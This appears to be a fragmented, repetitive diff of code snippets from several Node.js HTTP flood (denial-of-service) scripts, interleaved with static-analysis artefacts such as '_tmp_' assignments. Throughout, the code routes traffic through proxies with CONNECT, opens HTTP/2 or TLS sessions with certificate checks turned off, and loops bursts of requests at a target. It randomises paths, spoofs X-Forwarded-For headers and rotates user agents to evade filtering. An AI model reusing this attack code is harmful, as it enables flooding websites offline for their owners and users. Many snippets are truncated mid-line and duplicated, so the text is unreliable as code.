@@ -1,0 +1,313 @@
+var req = http.request({ 
+                    //set proxy session
+                    host: proxy[0],
+                    port: proxy[1],
+                    ciphers: cipper,
+                    method: 'CONNECT',
+                    path: parsed.host + ":443"
+                }, (err) => {
+                    req.end();
+                    return;
+                })
+req.on('connect', function (res, socket, head) { 
+                    //open raw request
+                        const client = http2.connect(parsed.href, {
+                            createConnection: () => tls.connect({
+                                host: parsed.host,
+                                ciphers: cipper, //'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
+                                secureProtocol: 'TLS_method',
+                                servername: parsed.host,
+                                secure: true,
+                                rejectUnauthorized: false,
+                                ALPNProtocols: ['h2'],
+                                //sessionTimeout: 5000,
+                                socket: socket
+                            }, function () {
+                                for (let i = 0; i< rate; i++){
+                                    headerbuilders[":path"] = `${url.parse(target).path.re...
+const client = http2.connect(parsed.href, {
+                            createConnection: () => tls.connect({
+                                host: parsed.host,
+                                ciphers: cipper, //'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
+                                secureProtocol: 'TLS_method',
+                                servername: parsed.host,
+                                secure: true,
+                                rejectUnauthorized: false,
+                                ALPNProtocols: ['h2'],
+                                //sessionTimeout: 5000,
+                                socket: socket
+                            }, function () {
+                                for (let i = 0; i< rate; i++){
+                                    headerbuilders[":path"] = `${url.parse(target).path.replace("%RAND%",ra())}?${randomparam}=${randstr.generate({length:12,charset:"ABCDEFGHIJKLMNOPQRSTUVWSYZabcdefghijklmnopqrs...
+tls.connect({
+                                host: parsed.host,
+                                ciphers: cipper, //'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
+                                secureProtocol: 'TLS_method',
+                                servername: parsed.host,
+                                secure: true,
+                                rejectUnauthorized: false,
+                                ALPNProtocols: ['h2'],
+                                //sessionTimeout: 5000,
+                                socket: socket
+                            }, function () {
+                                for (let i = 0; i< rate; i++){
+                                    headerbuilders[":path"] = `${url.parse(target).path.replace("%RAND%",ra())}?${randomparam}=${randstr.generate({length:12,charset:"ABCDEFGHIJKLMNOPQRSTUVWSYZabcdefghijklmnopqrstuvwsyz0123456789"})}`
+                                    headerbuilders["X-Forwarded-For...
+_tmp_3.push("Moziila/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.0 AOL/9.7 AOLBuild/4343.2039.US Safari/537.1")
+var req = http.request({ 
+                    //set proxy session
+                    host: proxy[0],
+                    port: proxy[1],
+                    ciphers: cipper,
+                    method: 'CONNECT',
+                    path: parsed.host + ":443"
+                }, (err) => {
+                    req.end();
+                    return;
+                })
+req.on('connect', function (res, socket, head) { 
+                    //open raw request
+                        const client = http2.connect(parsed.href, {
+                            createConnection: () => tls.connect({
+                                host: `${(url.parse(target).path.includes("%RAND%")) ? tagpage : url.parse(target).path}`,
+                                ciphers: cipper, //'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
+                                secureProtocol: 'TLS_method',
+                                servername: parsed.host,
+                                secure: true,
+                                rejectUnauthorized: false,
+                                ALPNProtocols: ['h2'],
+                                //sessionTimeout: 5000,
+                                socket: socket
+                            }, function () {
+                                for (let i = 0; i< rate; i++){
+                  ...
+const client = http2.connect(parsed.href, {
+                            createConnection: () => tls.connect({
+                                host: `${(url.parse(target).path.includes("%RAND%")) ? tagpage : url.parse(target).path}`,
+                                ciphers: cipper, //'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
+                                secureProtocol: 'TLS_method',
+                                servername: parsed.host,
+                                secure: true,
+                                rejectUnauthorized: false,
+                                ALPNProtocols: ['h2'],
+                                //sessionTimeout: 5000,
+                                socket: socket
+                            }, function () {
+                                for (let i = 0; i< rate; i++){
+                                    headerbuilders[":path"] = `${url.parse(target).path.replace("%RAND%",ra())}`
+                         ...
+tls.connect({
+                                host: `${(url.parse(target).path.includes("%RAND%")) ? tagpage : url.parse(target).path}`,
+                                ciphers: cipper, //'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
+                                secureProtocol: 'TLS_method',
+                                servername: parsed.host,
+                                secure: true,
+                                rejectUnauthorized: false,
+                                ALPNProtocols: ['h2'],
+                                //sessionTimeout: 5000,
+                                socket: socket
+                            }, function () {
+                                for (let i = 0; i< rate; i++){
+                                    headerbuilders[":path"] = `${url.parse(target).path.replace("%RAND%",ra())}`
+                                    headerbuilders["X-Forwarded-For"] = spoof();
+                                  ...
+_tmp_24.host = <operator>.formatString("", (url.parse(target).path.includes("%RAND%")) ? tagpage : url.parse(target).path, "")
+var req = http.request({ 
+                    //set proxy session
+                    host: proxy[0],
+                    port: proxy[1],
+					timeout: 10000,
+                    ciphers: cipper, //'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM:TLS13-AES128-GCM-SHA256:ECDHE-RSA-AES256-SHA384',
+					headers: {
+            				Host: parsed.host,
+            				"Proxy-Connection": "Keep-Alive",
+            				Connection: "Keep-Alive",
+          			     },
+					method: 'CONNECT',
+                    path: parsed.host + ":443"
+                }, 
+        function () {
+          req.setSocketKeepAlive(true);
+        }
+      )
+req.on('connect', function (res, socket, head) { 
+                    //open raw request
+                        const client = http2.connect(parsed.href, {
+                            createConnection: () => tls.connect({
+                              	host: parsed.host,
+                                servername: parsed.host,
+                                ciphers: cipper, //'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
+                                secureProtocol: 'TLS_method',
+								honorCipherOrder: true,
+								requestCert: true,
+								port: 443,
+                                secure: true,
+                                rejectUnauthorized: true,
+								ALPNProtocols: ['h2'],
+                                //sessionTimeout: 10000,
+                                socket: socket	
+                            }, function () {
+                                for (let i = 0; i< rate; i++){
+                                 ...
+const client = http2.connect(parsed.href, {
+                            createConnection: () => tls.connect({
+                              	host: parsed.host,
+                                servername: parsed.host,
+                                ciphers: cipper, //'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
+                                secureProtocol: 'TLS_method',
+								honorCipherOrder: true,
+								requestCert: true,
+								port: 443,
+                                secure: true,
+                                rejectUnauthorized: true,
+								ALPNProtocols: ['h2'],
+                                //sessionTimeout: 10000,
+                                socket: socket	
+                            }, function () {
+                                for (let i = 0; i< rate; i++){
+                                    headerbuilders[":path"] = `${url.parse(target).path.replace("%RAND%",ra())}?${randomparam}=${randstr.generate({length:...
+tls.connect({
+                              	host: parsed.host,
+                                servername: parsed.host,
+                                ciphers: cipper, //'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
+                                secureProtocol: 'TLS_method',
+								honorCipherOrder: true,
+								requestCert: true,
+								port: 443,
+                                secure: true,
+                                rejectUnauthorized: true,
+								ALPNProtocols: ['h2'],
+                                //sessionTimeout: 10000,
+                                socket: socket	
+                            }, function () {
+                                for (let i = 0; i< rate; i++){
+                                    headerbuilders[":path"] = `${url.parse(target).path.replace("%RAND%",ra())}?${randomparam}=${randstr.generate({length:12,charset:"ABCDEFGHIJKLMNOPQRSTUVWSYZabcdefghijklmnopqrstuvwsyz0123456789"})}`
+									h...
+_tmp_45.push("Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.90 Safari/537.36")
+var req = http.request({ 
+                    //set proxy session
+					host: proxy[0],
+					agent: agent,
+					globalAgent: agent,
+				    port: proxy[1],
+					timeout: 10000,
+			        ciphers: cipper, //'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM:TLS13-AES128-GCM-SHA256:ECDHE-RSA-AES256-SHA384',
+			        headers: {
+            				Host: parsed.host,
+            				"Proxy-Connection": "Keep-Alive",
+            				Connection: "Keep-Alive",
+          			     },
+                    method: 'CONNECT',
+                    path: parsed.host + ":443"
+                }, 
+        function () {
+          req.setSocketKeepAlive(true);
+        }
+      )
+req.on('connect', function (res, socket, head) { 
+                    //open raw request
+                        const client = http2.connect(parsed.href, {
+                            createConnection: () => tls.connect({
+								host: parsed.host,
+                                servername: parsed.host,
+                                ciphers: cipper, //'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
+                                secureProtocol: 'TLS_method',
+								honorCipherOrder: true,
+								requestCert: true,
+								port: 443,
+                                secure: true,
+                                rejectUnauthorized: false,
+								ALPNProtocols: ['h2'],
+                                //sessionTimeout: 10000,
+                                socket: socket	
+                            }, function () {
+                                for (let i = 0; i< rate; i++){
+                                    headerbuilders[":pa...
+const client = http2.connect(parsed.href, {
+                            createConnection: () => tls.connect({
+								host: parsed.host,
+                                servername: parsed.host,
+                                ciphers: cipper, //'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
+                                secureProtocol: 'TLS_method',
+								honorCipherOrder: true,
+								requestCert: true,
+								port: 443,
+                                secure: true,
+                                rejectUnauthorized: false,
+								ALPNProtocols: ['h2'],
+                                //sessionTimeout: 10000,
+                                socket: socket	
+                            }, function () {
+                                for (let i = 0; i< rate; i++){
+                                    headerbuilders[":path"] = `${url.parse(target).path.replace("%RAND%",ra())}` + randstr2(10) + '+' + randstr2(10);
+									headerbuilders["...
+tls.connect({
+								host: parsed.host,
+                                servername: parsed.host,
+                                ciphers: cipper, //'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
+                                secureProtocol: 'TLS_method',
+								honorCipherOrder: true,
+								requestCert: true,
+								port: 443,
+                                secure: true,
+                                rejectUnauthorized: false,
+								ALPNProtocols: ['h2'],
+                                //sessionTimeout: 10000,
+                                socket: socket	
+                            }, function () {
+                                for (let i = 0; i< rate; i++){
+                                    headerbuilders[":path"] = `${url.parse(target).path.replace("%RAND%",ra())}` + randstr2(10) + '+' + randstr2(10);
+									headerbuilders["X-Forwarded-For"] = proxy[0];
+                                    const req = client.reque...
+_tmp_21.push("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1664.3 Safari/537.36")
+var req = http.request({
+        host: proxy[0],
+        port: proxy[1],
+        ciphers: cipper,
+        method: 'CONNECT',
+        path: parsedTarget.host + ":443"
+    }, (err) => {
+        req.end();
+        return;
+    })
+req.on('connect', function (res, socket, head) {
+        var tlsConnection = tls.connect({
+            host: parsedTarget.host,
+            ciphers: cipper,
+            secureProtocol: 'TLS_method',
+            servername: parsedTarget.host,
+            secure: true,
+            rejectUnauthorized: false,
+            socket: socket
+        }, function () {
+            setInterval(() => {
+                for (let j = 0; j < args.rate; j++) {
+                    let headers = "GET " + queryString + " HTTP/1.1\r\n" +
+                        "Host: " + parsedTarget.host + "\r\n" +
+                        "Referer: " + args.target + "\r\n" +
+                        "Origin: " + args.target + "\r\n" +
+                        `Accept: ${randomElement(headerBuilder.accept)}\r\n` +
+                        "User-Agent: " + randomElement(headerBuilder.userAgent) + "\r\n" +
+                        "Upgrade-Insecure-Requests: 1\r\n" +
+                        `Accept-Encoding: ...
+var tlsConnection = tls.connect({
+            host: parsedTarget.host,
+            ciphers: cipper,
+            secureProtocol: 'TLS_method',
+            servername: parsedTarget.host,
+            secure: true,
+            rejectUnauthorized: false,
+            socket: socket
+        }, function () {
+            setInterval(() => {
+                for (let j = 0; j < args.rate; j++) {
+                    let headers = "GET " + queryString + " HTTP/1.1\r\n" +
+                        "Host: " + parsedTarget.host + "\r\n" +
+                        "Referer: " + args.target + "\r\n" +
+                        "Origin: " + args.target + "\r\n" +
+                        `Accept: ${randomElement(headerBuilder.accept)}\r\n` +
+                        "User-Agent: " + randomElement(headerBuilder.userAgent) + "\r\n" +
+                        "Upgrade-Insecure-Requests: 1\r\n" +
+                        `Accept-Encoding: ${randomElement(headerBuilder.acceptEncoding)}\r\n` +
+       ...
+_tmp_33.socket = socket
